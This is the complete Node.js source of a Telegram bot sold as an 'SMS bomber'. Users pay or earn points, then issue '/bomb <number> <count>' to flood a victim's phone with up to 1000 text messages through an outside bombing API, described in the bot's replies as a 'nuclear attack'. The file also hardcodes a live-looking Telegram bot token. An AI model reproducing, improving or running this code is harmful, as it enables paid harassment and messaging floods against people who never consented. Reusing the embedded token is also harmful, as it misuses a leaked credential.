const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');

// ============================================================
// CONFIGURATION
// ============================================================

const BOT_TOKEN = '8752553053:AAHQpj4IZJIxZK1n3n3LsJPSjAQ_pRCjG9Q';
const PORT = process.env.PORT || 3000;
const API_URL = 'https://huiyi67-sms-bomber.hf.space/api';

// ============================================================
// EXPRESS APP
// ============================================================

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ============================================================
// TELEGRAM BOT
// ============================================================

let bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ============================================================
// DATABASE (In-Memory)
// ============================================================

const users = {};
const stats = {
    totalBombs: 0,
    totalUsers: 0
};

// ============================================================
// TELEGRAM COMMANDS
// ============================================================

// ============================================================
// /start — Main Menu
// ============================================================

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const firstName = msg.from.first_name || 'User';

    if (!users[userId]) {
        users[userId] = { points: 3, totalSent: 0, joinedAt: new Date().toISOString() };
        stats.totalUsers++;
    }

    const keyboard = {
        inline_keyboard: [
            [{ text: '🔗 JOIN JinnProtocol', url: 'https://t.me/digitaldon247' }],
            [{ text: '✅ VERIFY', callback_data: 'verify' }],
            [{ text: '🔥 START BOMBING', callback_data: 'bomb' }],
            [{ text: '📊 STATS', callback_data: 'stats' }],
            [{ text: '👑 REFERRAL', callback_data: 'referral' }],
            [{ text: '💳 PURCHASE', callback_data: 'purchase' }],
            [{ text: '👨‍💻 DEVS', callback_data: 'devs' }],
            [{ text: '🆘 SUPPORT', callback_data: 'support' }]
        ]
    };

    bot.sendMessage(
        chatId,
        `👑 **GURU TALHA**\n\n` +
        `🔥 **JINN BOMBER**\n\n` +
        `✅ **VERIFIED!**\n\n` +
        `**WELCOME!**\n` +
        `• Balance: ${users[userId].points} PTS\n` +
        `• Max SMS: 1000\n\n` +
        `📡 Powered by GURU TALHA`,
        {
            parse_mode: 'Markdown',
            reply_markup: keyboard
        }
    );
});

// ============================================================
// CALLBACK QUERIES
// ============================================================

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const userId = query.from.id;
    const data = query.data;

    await bot.answerCallbackQuery(query.id);

    switch (data) {
        case 'verify':
            users[userId].verified = true;
            bot.sendMessage(
                chatId,
                `✅ **VERIFIED!**\n\n` +
                `🔥 You can now start bombing!\n` +
                `Use: /bomb <number> <count>`,
                { parse_mode: 'Markdown' }
            );
            break;

        case 'bomb':
            bot.sendMessage(
                chatId,
                `🔥 **START BOMBING**\n\n` +
                `📱 Enter Number:\n` +
                `Format: \`923001234567\``,
                { parse_mode: 'Markdown' }
            );
            break;

        case 'stats':
            const user = users[userId] || { points: 0, totalSent: 0 };
            bot.sendMessage(
                chatId,
                `📊 **STATS**\n\n` +
                `👤 User: ${query.from.first_name}\n` +
                `💎 Points: ${user.points} PTS\n` +
                `📱 Total Sent: ${user.totalSent}\n` +
                `👥 Total Users: ${stats.totalUsers}\n` +
                `💣 Total Bombs: ${stats.totalBombs}`,
                { parse_mode: 'Markdown' }
            );
            break;

        case 'referral':
            bot.sendMessage(
                chatId,
                `👑 **REFERRAL**\n\n` +
                `Invite friends and earn points!\n\n` +
                `🔗 Your link:\n` +
                `https://t.me/guru_sms_bot?start=ref_${userId}\n\n` +
                `🎁 You get 5 PTS per referral!`,
                { parse_mode: 'Markdown' }
            );
            break;

        case 'purchase':
            bot.sendMessage(
                chatId,
                `💳 **PURCHASE**\n\n` +
                `💎 10 PTS = 50 SMS — $1\n` +
                `💎 50 PTS = 300 SMS — $5\n` +
                `💎 100 PTS = 700 SMS — $10\n` +
                `💎 500 PTS = 5000 SMS — $50\n\n` +
                `Contact @itx_GuRu410 to buy`,
                { parse_mode: 'Markdown' }
            );
            break;

        case 'devs':
            bot.sendMessage(
                chatId,
                `👨‍💻 **DEVS**\n\n` +
                `👑 GURU TALHA\n` +
                `🔗 @itx_GuRu410\n` +
                `🔗 @itx_talha750\n\n` +
                `📡 Powered by GURU TALHA`,
                { parse_mode: 'Markdown' }
            );
            break;

        case 'support':
            bot.sendMessage(
                chatId,
                `🆘 **SUPPORT**\n\n` +
                `📢 Join our channels:\n` +
                `🔗 https://t.me/digitaldon247\n` +
                `🔗 https://t.me/digitaldon241\n\n` +
                `👑 Contact:\n` +
                `@itx_GuRu410\n` +
                `@itx_talha750`,
                { parse_mode: 'Markdown' }
            );
            break;

        default:
            bot.sendMessage(chatId, '❌ Unknown option');
    }
});

// ============================================================
// /bomb — Main Bombing Command
// ============================================================

bot.onText(/\/bomb (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const args = match[1].trim().split(' ');

    if (args.length < 2) {
        bot.sendMessage(
            chatId,
            `❌ **Usage:**\n` +
            `/bomb <number> <count>\n\n` +
            `Example:\n` +
            `/bomb 923001234567 20`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    const phone = args[0];
    const count = parseInt(args[1]);

    // Validate
    if (count > 1000) {
        bot.sendMessage(chatId, '❌ Max SMS is 1000');
        return;
    }

    let formattedPhone = phone;
    if (!formattedPhone.startsWith('92') && !formattedPhone.startsWith('+')) {
        if (formattedPhone.startsWith('0')) {
            formattedPhone = '92' + formattedPhone.substring(1);
        } else {
            formattedPhone = '92' + formattedPhone;
        }
    }
    formattedPhone = formattedPhone.replace(/^\+/, '');

    // Check points
    if (!users[userId]) {
        users[userId] = { points: 3, totalSent: 0 };
        stats.totalUsers++;
    }

    if (users[userId].points < 1) {
        bot.sendMessage(
            chatId,
            `❌ **Insufficient Points!**\n\n` +
            `You need 1 PTS for 1 SMS.\n` +
            `💎 Your Balance: ${users[userId].points} PTS\n\n` +
            `Use /referral to earn points or /purchase to buy.`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    // Deduct points
    const cost = Math.ceil(count / 10);
    users[userId].points -= cost;

    const msg1 = await bot.sendMessage(
        chatId,
        `🔥 **NUCLEAR ATTACK CONFIRMED!**\n\n` +
        `📱 Number: +${formattedPhone}\n` +
        `📊 Amount: ${count}\n` +
        `🧵 Workers: 50\n\n` +
        `⏳ Starting nuclear attack...`,
        { parse_mode: 'Markdown' }
    );

    try {
        // Call your API
        const url = `${API_URL}?msisdn=${formattedPhone}&count=${count}`;
        const response = await axios.get(url);

        // Update stats
        users[userId].totalSent += count;
        stats.totalBombs++;

        await bot.editMessageText(
            `✅ **NUCLEAR ATTACK COMPLETE!**\n\n` +
            `📱 Number: +${formattedPhone}\n` +
            `📊 SMS Sent: ${count}\n` +
            `💎 Points Used: ${cost}\n` +
            `💎 Remaining: ${users[userId].points} PTS\n\n` +
            `📡 Status: ${response.data.status || 'Success'}\n\n` +
            `👑 GURU TALHA`,
            {
                chat_id: chatId,
                message_id: msg1.message_id,
                parse_mode: 'Markdown'
            }
        );
    } catch (error) {
        // Refund points on error
        users[userId].points += cost;

        await bot.editMessageText(
            `❌ **NUCLEAR ATTACK FAILED!**\n\n` +
            `📱 Number: +${formattedPhone}\n` +
            `Error: ${error.message}\n\n` +
            `💎 Points Refunded: ${cost}\n` +
            `💎 Balance: ${users[userId].points} PTS\n\n` +
            `👑 GURU TALHA`,
            {
                chat_id: chatId,
                message_id: msg1.message_id,
                parse_mode: 'Markdown'
            }
        );
    }
});

// ============================================================
// /stats — Show User Stats
// ============================================================

bot.onText(/\/stats/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const user = users[userId] || { points: 3, totalSent: 0 };

    bot.sendMessage(
        chatId,
        `📊 **GURU STATS**\n\n` +
        `👤 User: ${msg.from.first_name}\n` +
        `💎 Points: ${user.points} PTS\n` +
        `📱 Total Sent: ${user.totalSent}\n` +
        `👥 Total Users: ${stats.totalUsers}\n` +
        `💣 Total Bombs: ${stats.totalBombs}\n\n` +
        `👑 GURU TALHA`,
        { parse_mode: 'Markdown' }
    );
});

// ============================================================
// /help — Show Help
// ============================================================

bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(
        chatId,
        `👑 **GURU SMS BOMBER**\n\n` +
        `📌 **Commands:**\n` +
        `/start - Main menu\n` +
        `/bomb <number> <count> - Start bombing\n` +
        `/stats - Your statistics\n` +
        `/referral - Invite friends\n` +
        `/purchase - Buy points\n` +
        `/help - Show this\n\n` +
        `📌 **Example:**\n` +
        `/bomb 923001234567 20\n\n` +
        `👑 GURU TALHA`,
        { parse_mode: 'Markdown' }
    );
});

// ============================================================
// /referral — Referral System
// ============================================================

bot.onText(/\/referral/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    bot.sendMessage(
        chatId,
        `👑 **REFERRAL**\n\n` +
        `Invite friends and earn points!\n\n` +
        `🔗 Your link:\n` +
        `https://t.me/guru_sms_bot?start=ref_${userId}\n\n` +
        `🎁 You get **5 PTS** per referral!\n` +
        `🎁 They get **3 PTS** on signup!\n\n` +
        `👑 GURU TALHA`,
        { parse_mode: 'Markdown' }
    );
});

// ============================================================
// /purchase — Purchase Points
// ============================================================

bot.onText(/\/purchase/, (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(
        chatId,
        `💳 **PURCHASE**\n\n` +
        `💎 **10 PTS** = 50 SMS — **$1**\n` +
        `💎 **50 PTS** = 300 SMS — **$5**\n` +
        `💎 **100 PTS** = 700 SMS — **$10**\n` +
        `💎 **500 PTS** = 5000 SMS — **$50**\n\n` +
        `Contact @itx_GuRu410 to buy\n\n` +
        `👑 GURU TALHA`,
        { parse_mode: 'Markdown' }
    );
});

// ============================================================
// HEALTH CHECK
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'online',
        bot: 'running',
        author: 'GURU TALHA',
        stats: stats,
        timestamp: new Date().toISOString()
    });
});

// ============================================================
// START SERVER
// ============================================================

app.listen(PORT, () => {
    console.log(`🚀 GURU SMS BOMBER running on port ${PORT}`);
    console.log(`👑 Powered by GURU TALHA`);
    console.log(`📡 API: ${API_URL}`);
});
